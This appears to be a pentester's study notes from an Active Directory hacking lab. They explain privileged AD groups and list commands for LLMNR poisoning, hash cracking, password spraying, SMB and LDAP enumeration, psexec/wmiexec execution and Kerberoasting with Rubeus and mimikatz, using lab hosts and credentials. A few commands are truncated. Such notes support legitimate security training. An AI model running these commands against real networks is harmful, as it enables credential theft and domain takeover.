## AD TOOLS:

### Domain Local vs. Domain Global vs. Universal Groups (The Simple Version)

Active Directory has different "scopes" for groups, but for a pentester's initial analysis, you can simplify it:

-   **Domain Groups:**  These are groups defined at the domain level. Their membership list is stored on the Domain Controllers.  `Domain Admins`,  `Account Operators`,  `Marketing`,  `HR`  are all domain groups.
-   **Local Groups:**  These groups exist  **only on a single computer**. The  `Administrators`  group on your laptop is different from the  `Administrators`  group on the file server. Their membership lists are stored locally on each machine in a file called the SAM.

### The Power Hierarchy: Privileged AD Groups

Not all groups are created equal. Some groups, by default, have permissions that can lead to a full domain compromise. A pentester  _must_  know these "high-value target" groups by heart.

Here is a tiered list of the most common and powerful  **built-in**  groups you will find in Active Directory.

#### Tier 0: "Keys to the Kingdom" - Compromise of any member means instant Domain compromise.

1.  **Enterprise Admins:**  The most powerful group in the entire Forest (a collection of domains). They are gods. If you find a user in here, you've won.
2.  **Domain Admins:**  The most powerful group in a single Domain. They can do anything on any computer within that domain, including modifying the Domain Controllers themselves.  **This is usually the primary goal of an attacker.**
3.  **Schema Admins:**  Can modify the fundamental structure (the schema) of Active Directory. Very powerful, very rare to find users in here.
4.  **Built-in Administrators:**  The default  `Administrator`  account is in this group. This group has full control over the domain.

#### Tier 1: "One Step Away" - Can often become Domain Admin with a few steps.

These groups have permissions that, while not direct Domain Admin, are so powerful they can often be used to escalate to it.

1.  **Backup Operators:**  This group is deceptively powerful. Members can log onto Domain Controllers and back up critical files, including the  **NTDS.dit**, which is the Active Directory database that contains all the user password hashes. If you compromise a Backup Operator, you can dump all the hashes in the domain.
2.  **Server Operators:**  Can log on to Domain Controllers interactively. Once you're on a DC, there are many ways to escalate to Domain Admin.
3.  **Account Operators:**  **(This is the one from your output!)**  This group can create, delete, and modify almost all user accounts and groups in the domain,  **except for the Tier 0 groups**  (like Domain Admins).
    -   **Why it's powerful:**  An Account Operator can't add themselves to Domain Admins directly, but they can change the password of almost any other user (except a Domain Admin). They can create new users, put them in other powerful groups, or reset the password of a sensitive user to take over their account. They have immense control over the "people" in the domain.
4.  **Print Operators:**  **(This is your answer to the lab question!)**  Historically, this group had extremely high privileges, including the ability to log onto Domain Controllers and load drivers. This has been toned down in modern versions, but on older or misconfigured domains, this group can be a golden ticket. Because of its historical power, defenders often overlook it, making it a great target.

#### Tier "Other": Situationally Powerful Groups

-   **DnsAdmins:**  Members of this group can sometimes load malicious DLLs onto DNS servers, which are often also Domain Controllers, leading to code execution.
-   **Remote Desktop Users:**  Can RDP into machines. If you find this group has been granted RDP access to a Domain Controller, that's a high-risk finding.


### Example
```
MemberOf
---------------------------------------------------------
CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

-   **`CN=Account Operators`**: This is the name of the group. As we just learned, this is a  **Tier 1 privileged group**. A member of this group can manage most other users and groups.
-   **`CN=Builtin`**: This tells you it's one of the default, built-in security groups that comes with Active Directory.
-   **`DC=INLANEFREIGHT,DC=LOCAL`**: This tells you the domain the group belongs to.

- -----
### Connect to RDP from Linux:

    xfreerdp /v:SERVER_IP /u:USERNAME /p:PASSWORD /clipboard /drive:shared,/home/$USER/shared /dynamic-resolution \

### Ping Sweep

    fping -asgq 172.16.5.0/23
### Responder on and let it listen for victims.
		```
		sudo responder -I eth0 -v 
		```
		
##### Get palin text password form the hash of Responder

    hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

 
#####  Inveigh as Responder's cousin who was born and raised in a Windows world.
Press the `ESC` key to enter the interactive console. The scrolling will stop, and you'll see a prompt like `NTLMv2(1:1)>`.
Type the command `GET NTLMV2UNIQUE` and press Enter. This will display a clean list of the unique hashes it has captured.

### Enum4Linux
The Tool:  `enum4linux-ng`  (the modern, better version of  `enum4linux`). It's designed specifically to check for this flaw.
```
enum4linux-ng -P 172.16.5.5
```
### LdapSearch
```
# -H = Host URL, -x = simple/anonymous bind, -b = base of search (the domain)
# The last part '(objectClass=user)' is the search filter.
# 'sAMAccountName' tells it to only show us the usernames.
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" '(objectClass=user)' sAMAccountName
```
### kerbrute
The `kerbrute` tool is designed to do this very quickly and report back only the valid names.

    kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt
    kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt Welcome1 | grep "VALID LOGIN"

### Password Spray from Windows

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

#  Credentialed Enumeration - from Linux
##  CrackMapExec

#### CME - Domain User Enumeration
```shell-session
 sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
#### CME - Domain Group Enumeration
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
#### CME - Logged On Users
```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
#### Share Enumeration - Domain Controller
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
#### Spider_plus
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

## SMBMap
#### SMBMap To Check Access

    smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

#### Recursive List Of All Directories

    smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Sha`

## rpcclient
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> queryuser 0x457

rpcclient $> enumdomusers
```
## Impacket Toolkit

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## Windapsearch 

#### Domain Admins

    python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo

#### Windapsearch - Privileged Users

`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo`

## BloodHound

`$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.`

# Credentialed Enumeration - from Windows
#### Discover Modules

```powershell-session
PS C:\htb> Get-Module
```

#### Load ActiveDirectory Module

```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```

#### Load ActiveDirectory Module

```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```
#### Get-ADUser

```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
#### Checking For Trust Relationships

```powershell-session
PS C:\htb> Get-ADTrust -Filter *
```
#### Group Enumeration

```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name

```
#### Detailed Group Info

```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
### Group Membership

```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```


## Snaffler Execution

Code:  bash

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
## SharpHound.exe 

```powershell-session
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```
#  LOTL Toolkit

Here's a breakdown of the primary "built-in" tools and what they are best for:

#### 1.  `net.exe`  Commands - The "Old Faithful"

-   **What it is:**  One of the oldest and most reliable sets of networking commands in Windows. It's fast, simple, and always there.
-   **Key Use Cases for Pentesters:**
    -   `net user <username> /domain`: Quickly get detailed information about a single domain user (group memberships, when password was last set, etc.).
    -   `net group "Domain Admins" /domain`: Instantly see who the most powerful users in the domain are. A primary command for target identification.
    -   `net localgroup Administrators`:  **CRITICAL COMMAND.**  This shows you who has administrative rights  **on the specific computer you are on**. This is how you identify privilege escalation paths on the local machine.
    -   `net view /domain`: Get a quick list of computers in the domain.

#### 2.  `dsquery`  /  `dsget`  - The "AD Scalpel"

-   **What it is:**  A command-line tool for performing precise LDAP queries against Active Directory. It's more powerful and flexible than  `net.exe`  for finding specific objects.  `dsquery`  _finds_  the object, and you often pipe (`|`) its output to  `dsget`  to  _retrieve_  specific details about that object.
-   **Key Use Cases for Pentesters:**
    -   `dsquery user`: Get a list of all users in their full Distinguished Name format.
    -   `dsquery * -filter "(<LDAP_FILTER>)"`: This is its most powerful feature. You can search for objects based on very specific attributes. For example, finding disabled accounts, accounts with a specific description, or accounts that don't require a password.

#### 3.  `wmic`  - The "System Inspector"

-   **What it is:**  Windows Management Instrumentation Command-line. It's a way to query the vast WMI database, which contains almost every piece of configuration information about a computer and its environment.
-   **Key Use Cases for Pentesters:**
    -   `wmic qfe get HotFixID,InstalledOn`: Check the patch level of a machine to see if it's vulnerable to known exploits.
    -   `wmic process list /format:list`: See all running processes. Useful for finding security software or interesting applications.
    -   `wmic useraccount list /format:list`: Get a detailed list of all  **local**  user accounts on the box.

#### 4. PowerShell (Built-in Cmdlets) - The "Modern Power Tool"

-   **What it is:**  PowerShell is the modern replacement for the classic command prompt and offers far more power and flexibility.
-   **Key Use Cases for Pentesters (without custom scripts):**
    -   `Get-MpComputerStatus`: The go-to command to check the status of Windows Defender (Antivirus).
    -   `Get-ChildItem Env:`: Quickly view all environment variables, which can reveal information about the domain, user profile paths, and the logon server.

#  Kerberoasting
**Active Directory Perspective:**

-   **Service Principal Name (SPN):**  An SPN is an attribute on a user or computer account that says, "This account is used to run a service (like  `MSSQLSvc/server.domain.local`)." It's like registering the account as a "driver" for a "company car."
-   **The Attack Flow:**
    1.  As an authenticated user, you query Active Directory (via LDAP) for all accounts that have an SPN set.
    2.  For each of those accounts, you go to the Kerberos  **Ticket-Granting Service (TGS)**  on the Domain Controller and request a  **Service Ticket**  (a TGS-REP) for that specific service.
    3.  Because of how Kerberos works,  _any authenticated user is allowed to request a service ticket for any service_. The TGS will happily give it to you.
    4.  The ticket you receive is encrypted. The encryption key is derived directly from the NTLM hash of the  **service account's password**.
    5.  You take this encrypted ticket offline and use a tool like  `hashcat`  to try millions of password guesses. For each guess,  `hashcat`  derives a key and tries to unlock the ticket. When it successfully unlocks, you have found the correct password.

### GETUSERSAPNS - LINUX

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sap_tgs.txt

hashcat -m 13100 sap_tgs.txt /usr/share/wordlists/rockyou.txt
```

### The Windows Kerberoasting Toolkit

#### 1. The "Semi-Manual" Method (`setspn`  + PowerShell +  `mimikatz`)

-   **What it is:**  This is the old-school, multi-step process. It's clunky but demonstrates the core components.
    -   `setspn.exe -Q */*`: Use the built-in Windows tool to  **query**  for all SPNs in the domain.
    -   `New-Object System.IdentityModel...`: Use PowerShell's .NET capabilities to manually  **request**  the TGS ticket for the SPN you found. This loads the ticket into your current session's memory.
    -   `mimikatz # kerberos::list /export`: Use the powerful credential dumping tool  `mimikatz`  to  **extract**  the ticket from memory.
-   **Why Learn It?**  It's important to understand that requesting a ticket and having it in memory are separate steps. This knowledge is crucial for more advanced Kerberos attacks. For day-to-day Kerberoasting, you will almost never use this method because it's too slow.

#### 2. The PowerView Method - The "PowerShell Powerhouse"

-   **What it is:**  PowerView combines the query and request steps into single, powerful functions.
-   **Key Command:**  `Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat`
    -   `Get-DomainUser -SPN`: This part queries AD for all the SPN accounts.
    -   `|`: The pipe sends that list of accounts to the next command.
    -   `Get-DomainSPNTicket -Format Hashcat`: For each account it receives, this command requests the TGS ticket and automatically formats it perfectly for  `hashcat`  to crack.
-   **Why it's Smart:**  This is a fantastic one-liner that automates the whole process within PowerShell. It's a great choice if PowerShell is your preferred tool.

#### 3. The Rubeus Method - The "Kerberos Specialist"

-   **What it is:**  `Rubeus.exe`  is a C# tool written by harmj0y, one of the top AD security researchers. It is considered the  **gold standard**  for all things Kerberos abuse on Windows. It's fast, incredibly powerful, and has options for every conceivable Kerberos attack.
-   **Key Command:**  `Rubeus.exe kerberoast /outfile:hashes.txt /nowrap`
    -   `kerberoast`: The action you want to perform.
    -   `/outfile:hashes.txt`: Automatically saves all the crackable hashes to a file.
    -   `/nowrap`: A quality-of-life flag that prevents the long hash string from being broken up across multiple lines, making it easy to copy/paste.
-   **Why it's the Best:**  Rubeus is the most efficient, feature-rich, and actively developed tool for this job. For Kerberoasting on Windows,  **Rubeus is almost always the right answer.**
- ---
